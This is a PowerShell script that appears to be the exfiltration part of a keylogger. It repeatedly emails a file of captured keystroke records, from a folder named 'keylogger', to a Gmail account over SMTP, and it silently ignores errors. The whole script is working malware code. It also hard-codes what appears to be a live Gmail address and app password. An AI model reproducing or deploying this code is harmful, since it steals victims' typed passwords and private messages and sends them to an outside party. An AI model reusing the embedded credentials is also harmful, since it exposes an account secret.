$SMTPServer = "smtp.gmail.com"
$SMTPPort = "587"

$Username = "cassidyemma91@gmail.com"
$Password = "ckuz khie yocw gxjk"

# Set the number of iterations for the loop
$iterations = 100

# Set the full path to the attachment file
$attachmentPath = "D:\keylogger\Key_logger_v_1.2\hosting_test\Record.txt"

# Initialize the loop counter
$i = 0

# Start the loop
while ($i -lt $iterations) {
    try {
        $to = "cassidyemma91@gmail.com"
        $subject = "records"
        $body = "records"
        $attachment = $attachmentPath

        $message = New-Object System.Net.Mail.MailMessage
        $message.subject = $subject
        $message.body = $body
        $message.to.add($to)
        $message.from = $username
        $message.attachments.add($attachment)

        $smtp = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort);
        $smtp.EnableSSL = $true

        $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
        $smtp.send($message);

        # Increment the loop counter
        $i++

        # Sleep for 5 seconds before sending the next email
        start-sleep 5

        $message.Dispose()
    }
    catch {
        # An error occurred while trying to send the email
        # You may want to log the error or handle it in some other way
    }
}
